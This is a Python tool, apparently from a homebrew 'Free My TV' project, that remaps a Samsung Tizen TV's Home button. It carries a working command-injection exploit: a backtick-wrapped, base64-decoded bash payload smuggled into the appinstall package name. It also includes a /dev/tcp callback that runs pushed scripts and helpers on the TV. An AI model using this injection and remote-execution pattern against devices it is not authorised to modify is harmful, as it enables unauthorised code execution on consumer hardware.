#!/usr/bin/env python3
"""Makes the Samsung remote's Home button open Free My TV (experimental, unofficial; see docs-fork/).

    python3 tizen/home-button/home_button.py info    --tv IP
    python3 tizen/home-button/home_button.py query   --tv IP --model MODEL --firmware FW [--save-baseline]
    python3 tizen/home-button/home_button.py verify  --tv IP --model MODEL --firmware FW --baseline FILE
    python3 tizen/home-button/home_button.py apply   --tv IP --model MODEL --firmware FW --baseline FILE
    python3 tizen/home-button/home_button.py restore --tv IP --model MODEL --firmware FW --baseline FILE

`info` only reads: the TV's network API, SDB capabilities and, as the SDK user, uid, architecture, firmware line
of /etc/prd_info.ini, dotnet and the native libraries the helpers need. `query` reads the Home settings with
HomeQuery.dll; `--save-baseline` keeps them as this TV's original values (refused if Home already points at the
app). `verify` checks the TV still matches the baseline, `apply` points Home at the app, `restore` writes the
baseline back. Build the helpers first with ./build.sh.

How it runs code on the TV: it pushes a small shell script into the SDK's temporary folder and triggers it through
the package-name handling of `0 appinstall tpk`, which runs it as the SDK user (uid 901, no root). This is the
method published in chris-ritsen/samsung-tv-root (src/samsung_tv_root/sdb.py). The script answers over a TCP
connection from the TV back to this computer, checked by the TV's IP and a random token. The native helpers are
adapted from NelsonEU/arn0-tv (MIT). Only Tizen 6.5 on ARMv7 is accepted.

Every run writes a JSON report (it contains the TV's IP: keep it private). Exit code 0 only when the TV confirmed
the whole operation.
"""
import argparse
import base64
import datetime
import importlib.util
import json
import os
import re
import secrets
import socket
import sys
import threading
import time
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
INSTALL_PY = os.path.join(os.path.dirname(HERE), 'install.py')   # tizen/install.py, for its Sdb class
OUT = os.path.join(HERE, 'out')
PLATFORM, ARCH = '6.5', 'armv7'    # the only platform this was tested on; the helpers assume 32-bit ARM
SAFE = re.compile(r'^[A-Za-z0-9._-]+$')
KEYS = ['home_operation', 'db/appfw/home_appid', 'db/appfw/startup_appid',
        'db/appfw/booting_appid_backup', 'db/first_screen/type']
AUTO_KEY = 'db/menu/smart_hub/ontvsetting/auto_start'
MARKERS = {'verify': 'HOME_BASELINE_MATCH=', 'apply': 'HOME_APPLIED=', 'restore': 'HOME_RESTORED='}

INFO_SCRIPT = '''id
uname -m
if [ "$(id -u)" != 901 ]; then echo UNEXPECTED_UID_STOP; exit 1; fi
echo FIRMWARE
grep -E 'T-[A-Z]{4}|Version|version' /etc/prd_info.ini
echo DOTNET
command -v dotnet
echo LIBRARIES
for p in /usr/lib/libvconf.so.0 /usr/lib/libaul.so.0 /usr/lib/libbundle.so.0 /usr/lib/libcapi-appfw-app-operation-tv.so.0 /usr/lib/libapp-context-manager-common.so; do
  if [ -r "$p" ]; then ls -l "$p"; fi
done
echo QUERY_COMPLETE
'''


def safe(value, what):
    if not isinstance(value, str) or not SAFE.match(value):
        raise SystemExit('%s must be letters, digits, ".", "_" or "-" only: %r' % (what, value))
    return value


def load_sdb():
    spec = importlib.util.spec_from_file_location('fmt_install', INSTALL_PY)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module.Sdb


def network_model(ip):
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    with opener.open('http://%s:8001/api/v2/' % ip, timeout=5) as response:
        return json.load(response).get('device', {})


def parse_values(text):
    """The key=value lines between QUERY_BEGIN and QUERY_END of HomeQuery's output."""
    begin, end = text.find('QUERY_BEGIN'), text.find('QUERY_END')
    if begin < 0 or end < begin:
        return None
    values = {}
    for line in text[begin:end].splitlines()[1:]:
        key, sep, value = line.partition('=')
        if sep:
            values[key.strip()] = value.strip()
    return values


def load_baseline(path, args):
    with open(path) as handle:
        saved = json.load(handle)
    if saved.get('kind') != 'free-my-tv-home-baseline' or not saved.get('complete'):
        raise SystemExit('Not a complete baseline file: ' + path)
    for field, wanted in (('model', args.model), ('firmware', args.firmware), ('app_id', args.app_id)):
        if saved.get(field) != wanted:
            raise SystemExit('Baseline %s is %r, not %r: this baseline belongs to another TV or app'
                             % (field, saved.get(field), wanted))
    values = saved.get('values', {})
    for key in KEYS:
        safe(values.get(key), 'baseline ' + key)
        if values[key] == args.app_id:
            raise SystemExit('Baseline already names %s (%s): it was captured after a change' % (args.app_id, key))
    if not re.match(r'^-?\d+$', str(values.get(AUTO_KEY, ''))):
        raise SystemExit('Baseline has no valid ' + AUTO_KEY)
    return [values[k] for k in KEYS] + [str(values[AUTO_KEY])]


def run(args):
    Sdb = load_sdb()
    ip = args.tv
    token = secrets.token_hex(12)
    remote = '/home/owner/share/tmp/sdk_tools/home-button-' + token + '.sh'
    action = args.action
    report = {'tv_ip': ip, 'action': action, 'app_id': args.app_id,
              'method': 'SDK user (uid 901) via SDB; no root'}
    baseline_args = args.baseline_values
    client = None
    pushed = False
    staged = []
    state = {}
    data = b''
    report['phase'] = 'identity_check'
    try:
        device = network_model(ip)
        model = device.get('modelName')
        report['model'] = model
        if action != 'info' and model != args.model:
            raise RuntimeError('TV model is %r, expected %r; stopped' % (model, args.model))
        print('TV:', model, '| Action:', action, flush=True)
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as route:
            route.connect((ip, 26101))
            host = route.getsockname()[0]
        with socket.socket() as listener:
            listener.bind((host, 0))
            listener.listen(2)
            port = listener.getsockname()[1]
            report['phase'] = 'sdb_connect'
            client = Sdb(ip)
            report['phase'] = 'sdb_capabilities'
            caps = client.capabilities()
            report['platform'] = [caps.get('platform_version'), caps.get('cpu_arch')]
            if caps.get('platform_version') != PLATFORM or caps.get('cpu_arch') != ARCH:
                raise RuntimeError('Unexpected platform %s/%s (only %s/%s is supported); stopped before staging'
                                   % (caps.get('platform_version'), caps.get('cpu_arch'), PLATFORM, ARCH))
            header = ("/bin/rm -f %s\nexec 3<>/dev/tcp/%s/%d || exit 1\nprintf '%s\\n' >&3\n"
                      % (remote, host, port, token))
            if action == 'info':
                script = header + '{\n' + INFO_SCRIPT + '} >&3 2>&3\nexec 3>&-\n'
            else:
                payload = remote[:-3] + '.dll'
                if action == 'query':
                    helper, helper_args = 'HomeQuery.dll', [args.firmware, args.app_id]
                else:
                    helper = 'HomeControl.dll'
                    helper_args = [action, args.firmware, args.app_id, args.package] + baseline_args
                for value in helper_args:
                    safe(value, 'helper argument')   # they go into a shell line on the TV
                script = (header.replace('exec 3<>', "trap '/bin/rm -f %s' EXIT\nexec 3<>" % payload, 1)
                          + 'dotnet --globalizationinvariant %s %s >&3 2>&3\n' % (payload, ' '.join(helper_args))
                          + "result=$?\nprintf '\\nHELPER_EXIT=%s\\n' \"$result\" >&3\nexec 3>&-\n")
                with open(os.path.join(OUT, helper), 'rb') as handle:
                    client.push(payload, handle.read())
                staged.append(payload)
            report['phase'] = 'stage_script'
            client.push(remote, script.encode())
            pushed = True
            # A per-run directory keeps the install handler from running the script twice.
            gate = '/tmp/hb-' + token
            command = '/bin/mkdir %s 2>/dev/null&&{ . %s; /bin/rmdir %s;}' % (gate, remote, gate)
            encoded = base64.b64encode(command.encode()).decode()
            request = '0 appinstall tpk new2.tpk`printf${IFS}%%s${IFS}%s|base64${IFS}-d|bash`.tpk' % encoded
            if len(request.encode()) > 510:
                raise RuntimeError('Command exceeds the transport limit')

            def trigger():
                try:
                    state['transport'] = client.shell(request, seconds=25)
                except Exception as exc:
                    # The appinstall service often "refuses" while the script has already run: success is decided
                    # only by the authenticated callback and the helper's markers below.
                    state['transport_error'] = str(exc)
            worker = threading.Thread(target=trigger, daemon=True)
            worker.start()
            report['phase'] = 'waiting_for_tv_callback'
            print('Waiting for the TV on %s:%d...' % (host, port), flush=True)
            deadline = time.monotonic() + 30
            while True:
                listener.settimeout(max(0.1, deadline - time.monotonic()))
                connection, address = listener.accept()
                with connection:
                    if address[0] != ip:
                        continue
                    report['phase'] = 'receiving_tv_output'
                    receive_deadline = time.monotonic() + 30
                    data = b''
                    limit = 65536
                    while len(data) < limit:
                        remaining = receive_deadline - time.monotonic()
                        if remaining <= 0:
                            raise TimeoutError('Overall receive deadline exceeded')
                        connection.settimeout(min(10, remaining))
                        part = connection.recv(4096)
                        if not part:
                            break
                        data += part
                first, _, body = data.partition(b'\n')
                if first.decode(errors='replace') != token:
                    raise RuntimeError('Unexpected callback token')
                output = body.decode(errors='replace')
                report['output'] = output
                report['output_limit_reached'] = len(data) >= limit
                if action == 'info':
                    report['complete'] = 'QUERY_COMPLETE' in output
                elif action == 'query':
                    report['complete'] = 'QUERY_END' in output and 'HELPER_EXIT=0' in output
                else:
                    report['complete'] = MARKERS[action] in output and 'HELPER_EXIT=0' in output
                break
            worker.join(timeout=2)
            report.update(state)
            report['phase'] = 'finished'
    except Exception as exc:
        report['error'] = str(exc)
        report['complete'] = False
        report.update(state)
        first, separator, partial = data.partition(b'\n')
        if separator and first.decode(errors='replace') == token:
            report['partial_output'] = partial.decode(errors='replace')
        report['received_bytes'] = len(data)
        if pushed:
            report['possible_temporary_file'] = remote
        if staged:
            report['possible_temporary_payloads'] = staged
    finally:
        if client:
            client.sock.close()
    return report, token


def save_baseline(args, report, token):
    values = parse_values(report.get('output', ''))
    if not values or any(k not in values for k in KEYS + [AUTO_KEY]):
        raise SystemExit('Query output incomplete; no baseline saved')
    if values.get('home_operation') == args.app_id or values.get('db/appfw/home_appid') == args.app_id:
        raise SystemExit('Home already points at %s: these are not original values; no baseline saved' % args.app_id)
    baseline = {
        'kind': 'free-my-tv-home-baseline', 'complete': True,
        'captured': datetime.datetime.now().isoformat(timespec='seconds'),
        'model': args.model, 'firmware': args.firmware, 'app_id': args.app_id,
        'values': {k: values[k] for k in KEYS + [AUTO_KEY]},
        'launcher_boot_supported': values.get('launcher_boot_supported'),
    }
    path = os.path.join(args.out, 'baseline-%s-%s.json' % (args.model, token))
    with open(path, 'x') as handle:     # never overwrite a baseline
        json.dump(baseline, handle, indent=2)
        handle.write('\n')
    return path


def main():
    parser = argparse.ArgumentParser(description=__doc__.split('\n\n')[0])
    parser.add_argument('action', choices=['info', 'query', 'verify', 'apply', 'restore'])
    parser.add_argument('--tv', required=True, help="the TV's IP address")
    parser.add_argument('--model', help='expected modelName from the TV (see `info`); required except for info')
    parser.add_argument('--firmware', help='expected firmware, e.g. T-PTMDEUC-1720.7 (see `info`); required except for info')
    parser.add_argument('--app-id', default='FreeMyTVio.FreeMyTV', help='app to put on Home (default: Free My TV)')
    parser.add_argument('--package', help='Tizen package of that app (default: the part of the app id before the dot)')
    parser.add_argument('--baseline', help='baseline file saved by `query --save-baseline` (verify/apply/restore)')
    parser.add_argument('--save-baseline', action='store_true', help='with query: keep the values as the original')
    parser.add_argument('--out', default=os.path.join(os.getcwd(), 'home-button-reports'),
                        help='folder for reports and baselines (default: ./home-button-reports)')
    args = parser.parse_args()
    if args.action != 'info':
        if not args.model or not args.firmware:
            parser.error('--model and --firmware are required for ' + args.action)
        safe(args.model, '--model')
        safe(args.firmware, '--firmware')
    safe(args.app_id, '--app-id')
    args.package = safe(args.package or args.app_id.split('.')[0], '--package')
    if args.action in MARKERS and not args.baseline:
        parser.error('--baseline is required for ' + args.action)
    if args.save_baseline and args.action != 'query':
        parser.error('--save-baseline only goes with query')
    if args.action != 'info':
        helper = 'HomeQuery.dll' if args.action == 'query' else 'HomeControl.dll'
        if not os.path.exists(os.path.join(OUT, helper)):
            parser.error('%s not built: run %s first' % (helper, os.path.join(HERE, 'build.sh')))
    args.baseline_values = load_baseline(args.baseline, args) if args.action in MARKERS else None
    os.makedirs(args.out, exist_ok=True)

    report, token = run(args)
    path = os.path.join(args.out, 'home-%s-%s.json' % (args.action, token))
    with open(path, 'w') as handle:
        json.dump(report, handle, ensure_ascii=False, indent=2)
        handle.write('\n')
    print(json.dumps(report, ensure_ascii=False, indent=2))
    print('Report saved in:', path)
    if args.save_baseline and report.get('complete'):
        print('Baseline saved in:', save_baseline(args, report, token))
    if not report.get('complete'):
        print('Not confirmed. Read the report; on an unclear result run `query` before trying anything else.')
    return 0 if report.get('complete') else 1


if __name__ == '__main__':
    sys.exit(main())
